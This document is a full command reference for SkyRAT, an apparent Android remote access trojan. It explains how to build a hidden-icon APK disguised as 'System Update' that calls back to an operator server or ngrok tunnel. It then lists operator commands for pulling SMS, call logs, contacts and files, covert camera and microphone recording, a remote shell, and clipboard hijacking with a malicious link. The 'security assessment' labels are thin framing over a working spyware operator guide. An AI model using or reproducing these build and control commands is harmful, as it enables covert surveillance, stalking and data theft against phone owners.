# SkyRAT Command Reference

Complete reference for all SkyRAT commands and their usage.

## 📋 Command Categories

- [Framework Commands](#framework-commands) - Main SkyRAT operations
- [Device Information](#device-information) - Device and system details
- [File Operations](#file-operations) - File system management
- [Data Extraction](#data-extraction) - Communication and app data
- [Recording Commands](#recording-commands) - Audio and video capture
- [System Operations](#system-operations) - Process and network management
- [Utility Commands](#utility-commands) - Miscellaneous tools

## 🚀 Framework Commands

### **Build Commands**
```bash
python3 skyrat.py --build [OPTIONS]
```

#### **Required Parameters**
| Parameter | Description | Example |
|-----------|-------------|---------|
| `-i, --ip` | Server IP address | `-i 192.168.1.100` |
| `-p, --port` | Server port | `-p 8000` |

#### **Optional Parameters**
| Parameter | Description | Default | Example |
|-----------|-------------|---------|---------|
| `-o, --output` | Output APK filename | `skyrat.apk` | `-o test.apk` |
| `--visible-icon` | Make app icon visible | Hidden | `--visible-icon` |
| `--app-name` | Custom app display name | `System Update` | `--app-name "Security Scanner"` |
| `--clean` | Clean build directory | False | `--clean` |
| `--debug` | Enable verbose output | False | `--debug` |
| `--ngrok` | Use ngrok tunnel | False | `--ngrok` |

#### **Build Examples**
```bash
# Basic build
python3 skyrat.py --build -i 192.168.1.100 -p 8000

# Custom configuration
python3 skyrat.py --build -i 10.0.0.5 -p 9000 -o lab-test.apk --app-name "System Tools"

# Visible app with clean build
python3 skyrat.py --build --clean --visible-icon -i 192.168.1.100 -p 8000

# External access build
python3 skyrat.py --build --ngrok -p 8000 -o remote.apk

# Debug build
python3 skyrat.py --build --debug -i 127.0.0.1 -p 8000
```

### **Server Commands**
```bash
python3 skyrat.py --shell [OPTIONS]
```

#### **Server Parameters**
| Parameter | Description | Example |
|-----------|-------------|---------|
| `-i, --ip` | Server listening IP | `-i 192.168.1.100` |
| `-p, --port` | Server listening port | `-p 8000` |
| `--debug` | Enable debug output | `--debug` |

#### **Server Examples**
```bash
# Local server
python3 skyrat.py --shell -i 192.168.1.100 -p 8000

# Listen on all interfaces
python3 skyrat.py --shell -i 0.0.0.0 -p 8000

# Debug server
python3 skyrat.py --shell -i 192.168.1.100 -p 8000 --debug
```

## 📱 Device Information

### **deviceInfo**
Get comprehensive device information including hardware, system, and build details.

```bash
SkyRAT:/> deviceInfo
```

**Output includes:**
- Hardware details (model, manufacturer, brand)
- System information (Android version, API level)
- Build information (fingerprint, security patch)
- Device identifiers and serial numbers

**Example Output:**
```
=== DEVICE INFORMATION ===

Hardware:
  Model: SM-G998B
  Manufacturer: samsung
  Brand: samsung
  Device: o1s
  Product: o1sxxx
  Board: universal2100
  Hardware: exynos2100

System:
  Android: 13
  API Level: 33
  Fingerprint: samsung/o1sxxx/o1s:13/TP1A.220624.014/G998BXXU5EWCB:user/release-keys
  Security Patch: 2024-01-01
```

### **getIP**
Get device IP address and network information.

```bash
SkyRAT:/> getIP
```

**Returns:** Device IP address on current network

### **getMACAddress**
Get network interface MAC addresses.

```bash
SkyRAT:/> getMACAddress
```

**Returns:** MAC address of wireless interface

### **getSimDetails**
Get SIM card and cellular network information.

```bash
SkyRAT:/> getSimDetails
```

**Output includes:**
- Network operator information
- SIM card details
- Phone number (if available)
- Cellular network type
- IMEI information

**Example Output:**
```
=== SIM DETAILS ===

Network Operator: Verizon
Network Country: US
SIM Country: US
SIM Operator: Verizon Wireless
SIM State: 5
Phone Type: 1
Network Type: 13
Phone Number: +1234567890
```

### **sysinfo**
Get detailed system information including memory, storage, and performance data.

```bash
SkyRAT:/> sysinfo
```

**Output includes:**
- Memory usage and availability
- Storage space (internal/external)
- CPU information
- System uptime
- Running processes summary

## 📁 File Operations

### **pwd**
Show current working directory.

```bash
SkyRAT:/> pwd
```

**Returns:** Current directory path

### **cd**
Change current directory.

```bash
SkyRAT:/> cd <path>
```

**Examples:**
```bash
SkyRAT:/> cd /sdcard/Download
SkyRAT:/> cd /system/app
SkyRAT:/> cd ..
SkyRAT:/> cd /
```

### **ls**
List directory contents with detailed information.

```bash
SkyRAT:/> ls [path]
```

**Examples:**
```bash
SkyRAT:/> ls
SkyRAT:/> ls /sdcard/DCIM
SkyRAT:/> ls /system/bin
```

**Output format:**
```
=== DIRECTORY LISTING: /sdcard/Download ===

FILE  15.2 MB  2024-03-15 14:30  rw-  document.pdf
DIR         2024-03-14 09:15  rwx  Images
FILE  2.1 MB   2024-03-13 16:45  rw-  video.mp4
```

### **download**
Download files from device to server.

```bash
SkyRAT:/> download <file_path>
```

**Examples:**
```bash
SkyRAT:/> download /sdcard/DCIM/Camera/IMG_001.jpg
SkyRAT:/> download /system/build.prop
SkyRAT:/> download /data/app/com.example.app/base.apk
```

**Features:**
- Supports files up to 50MB
- Preserves original filename and extension
- Automatic timestamping
- Base64 encoded transfer

**Output location:** `dumps/Downloaded_TIMESTAMP_filename.ext`

### **upload**
Upload files from server to device.

```bash
SkyRAT:/> upload <local_filename>
```

**Examples:**
```bash
SkyRAT:/> upload config.txt
SkyRAT:/> upload screenshot.png
SkyRAT:/> upload malware_sample.apk
```

**Features:**
- Uploads to `/sdcard/uploaded_files/`
- Automatic filename conflict resolution
- Progress indication for large files

### **delete**
Delete files or directories from device.

```bash
SkyRAT:/> delete <path>
```

**Examples:**
```bash
SkyRAT:/> delete /sdcard/test.txt
SkyRAT:/> delete /sdcard/temp_folder
SkyRAT:/> delete -f /system/app/unwanted.apk
```

**Options:**
- `-f`: Force delete (attempts multiple deletion methods)
- Supports both files and directories
- Recursive directory deletion

### **mkdir**
Create directories on device.

```bash
SkyRAT:/> mkdir <directory_path>
```

**Examples:**
```bash
SkyRAT:/> mkdir /sdcard/test_folder
SkyRAT:/> mkdir /data/local/tmp/tools
```

## 📊 Data Extraction

### **getSMS**
Extract SMS messages from device.

```bash
SkyRAT:/> getSMS [inbox|sent]
```

**Examples:**
```bash
SkyRAT:/> getSMS inbox
SkyRAT:/> getSMS sent
SkyRAT:/> getSMS
```

**Output includes:**
- Message content and metadata
- Sender/recipient numbers
- Timestamps
- Message types

**File location:** `dumps/inbox_SMS_TIMESTAMP.txt`

### **getCallLogs**
Extract call history and logs.

```bash
SkyRAT:/> getCallLogs
```

**Output includes:**
- Call types (incoming, outgoing, missed)
- Phone numbers and contact names
- Call duration and timestamps
- Call frequency statistics

**File location:** `dumps/Call_Logs_TIMESTAMP.txt`

### **getContacts**
Extract contact list with details.

```bash
SkyRAT:/> getContacts
```

**Output includes:**
- Contact names and phone numbers
- Email addresses
- Contact photos (if available)
- Contact groups and categories

**File location:** `dumps/Contacts_TIMESTAMP.txt`

### **getApps**
Get list of installed applications.

```bash
SkyRAT:/> getApps
```

**Output includes:**
- App names and package names
- Version information
- Installation dates
- App types (system/user)
- App permissions

**File location:** `dumps/Applications_TIMESTAMP.txt`

### **getPhotos**
Get photo metadata and information.

```bash
SkyRAT:/> getPhotos
```

**Output includes:**
- Photo file paths and names
- Creation timestamps
- File sizes
- Camera metadata (if available)

### **getAudio**
Get audio file information.

```bash
SkyRAT:/> getAudio
```

**Output includes:**
- Audio file locations
- File formats and duration
- Artist and album information
- File sizes

### **getVideos**
Get video file information.

```bash
SkyRAT:/> getVideos
```

**Output includes:**
- Video file locations
- Video duration and format
- Resolution and codec information
- File sizes

## 🎥 Recording Commands

### **camList**
List available cameras on device.

```bash
SkyRAT:/> camList
```

**Output example:**
```
=== AVAILABLE CAMERAS ===

Camera 0: Back
Camera 1: Front
```

### **startVideo**
Start video recording with specified camera.

```bash
SkyRAT:/> startVideo [camera_id]
```

**Examples:**
```bash
SkyRAT:/> startVideo 0    # Back camera
SkyRAT:/> startVideo 1    # Front camera
SkyRAT:/> startVideo      # Default (back camera)
```

**Features:**
- 720p resolution recording
- H.264 video encoding
- AAC audio encoding
- Real-time status feedback

**Important:** Wait for confirmation before issuing `stopVideo`

### **stopVideo**
Stop video recording and download the file.

```bash
SkyRAT:/> stopVideo
```

**Features:**
- Automatic file download
- MP4 format output
- File size reporting
- Metadata extraction

**File location:** `dumps/Video_TIMESTAMP.mp4`

### **startAudio**
Start audio recording.

```bash
SkyRAT:/> startAudio
```

**Features:**
- High-quality AAC encoding
- Stereo recording (if supported)
- 44.1kHz sampling rate
- Real-time status feedback

### **stopAudio**
Stop audio recording and download the file.

```bash
SkyRAT:/> stopAudio
```

**Features:**
- Automatic file download
- M4A format output
- Audio quality reporting
- Duration calculation

**File location:** `dumps/Audio_TIMESTAMP.m4a`

## 🖥️ System Operations

### **ps**
List running processes and applications.

```bash
SkyRAT:/> ps
```

**Output includes:**
- Process IDs (PIDs)
- Process names
- Memory usage
- Process importance levels

### **kill**
Terminate processes by name.

```bash
SkyRAT:/> kill <process_name>
```

**Examples:**
```bash
SkyRAT:/> kill com.android.chrome
SkyRAT:/> kill com.facebook.katana
SkyRAT:/> kill system_server
```

### **shell**
Execute shell commands or enter interactive shell.

```bash
SkyRAT:/> shell [command]
```

**Examples:**
```bash
# Single command
SkyRAT:/> shell ls -la /system

# Interactive shell
SkyRAT:/> shell
android@shell:~$ ps aux
android@shell:~$ cat /proc/version
android@shell:~$ exit
```

### **netstat**
Show network connections and statistics.

```bash
SkyRAT:/> netstat
```

**Output includes:**
- Active network connections
- Listening ports
- Network interface statistics
- Connection states

### **ping**
Test network connectivity to hosts.

```bash
SkyRAT:/> ping <hostname>
```

**Examples:**
```bash
SkyRAT:/> ping google.com
SkyRAT:/> ping 8.8.8.8
SkyRAT:/> ping 192.168.1.1
```

## 🛠️ Utility Commands

### **getClipData**
Get current clipboard contents.

```bash
SkyRAT:/> getClipData
```

**Returns:** Current clipboard text content

### **setClip**
Set clipboard contents.

```bash
SkyRAT:/> setClip <text>
```

**Examples:**
```bash
SkyRAT:/> setClip "Hello World"
SkyRAT:/> setClip "http://malicious-site.com"
```

### **vibrate**
Make device vibrate.

```bash
SkyRAT:/> vibrate [times]
```

**Examples:**
```bash
SkyRAT:/> vibrate        # Single vibration
SkyRAT:/> vibrate 3      # Vibrate 3 times
SkyRAT:/> vibrate 5      # Vibrate 5 times
```

### **help**
Show command help and reference.

```bash
SkyRAT:/> help
```

**Returns:** Complete command reference with examples

### **clear**
Clear the terminal screen.

```bash
SkyRAT:/> clear
```

### **exit**
Close connection and exit.

```bash
SkyRAT:/> exit
```

## ⏱️ Command Timing and Timeouts

Different commands have different timeout values based on expected execution time:

| Command Type | Timeout | Examples |
|--------------|---------|----------|
| Quick Commands | 10s | `deviceInfo`, `getIP`, `pwd`, `ls` |
| Standard Commands | 15s | `shell`, `ps`, `kill`, `delete` |
| Data Extraction | 20s | `getSMS`, `getCallLogs`, `getContacts` |
| File Operations | 30s | `download`, `upload` |
| Recording Start | 30s | `startVideo`, `startAudio` |
| Recording Stop | 60s | `stopVideo`, `stopAudio` |

## 📝 Command Best Practices

### **File Operations**
1. Use absolute paths when possible
2. Check file permissions before download
3. Be cautious with system file modifications
4. Monitor available storage space

### **Recording Operations**
1. Always wait for start confirmation
2. Don't interrupt recording operations
3. Check available storage before recording
4. Be aware of battery impact

### **Data Extraction**
1. Check permissions before extraction
2. Be mindful of privacy implications
3. Secure extracted data appropriately
4. Document all extraction activities

### **System Operations**
1. Use shell commands carefully
2. Avoid killing critical system processes
3. Monitor system performance impact
4. Test in isolated environments

## 🚨 Error Handling

### **Common Error Messages**

#### **Permission Denied**
```
Permission denied: READ_SMS required
```
**Solution:** Grant required permissions in Android settings

#### **File Not Found**
```
ERROR: File not found: /nonexistent/file.txt
```
**Solution:** Verify file path and permissions

#### **Timeout Errors**
```
TIMEOUT: No response received (command may still be running)
```
**Solution:** Wait longer or retry command

#### **Connection Errors**
```
Connection error: [Errno 32] Broken pipe
```
**Solution:** Check network connection and restart

### **Debugging Commands**
```bash
# Enable debug mode
python3 skyrat.py --shell -i IP -p PORT --debug

# Check command syntax
SkyRAT:/> help

# Test basic connectivity
SkyRAT:/> getIP
```

## 🔗 Command Chaining and Automation

### **Sequential Commands**
```bash
# Example testing sequence
SkyRAT:/> deviceInfo
SkyRAT:/> getIP
SkyRAT:/> getSMS inbox
SkyRAT:/> getCallLogs
SkyRAT:/> getContacts
SkyRAT:/> getApps
```

### **File System Exploration**
```bash
# Systematic file system exploration
SkyRAT:/> ls /
SkyRAT:/> ls /sdcard
SkyRAT:/> ls /system/app
SkyRAT:/> ls /data/app
```

### **Security Assessment Sequence**
```bash
# Complete security assessment
SkyRAT:/> deviceInfo          # Device profiling
SkyRAT:/> getApps             # Application inventory
SkyRAT:/> getSMS inbox        # Communication analysis
SkyRAT:/> getCallLogs         # Call pattern analysis
SkyRAT:/> shell ps aux        # Process analysis
SkyRAT:/> netstat             # Network analysis
```

---

**This completes the comprehensive SkyRAT command reference. For usage examples and tutorials, see the [Usage Manual](usage.md) and [Examples](../examples/).**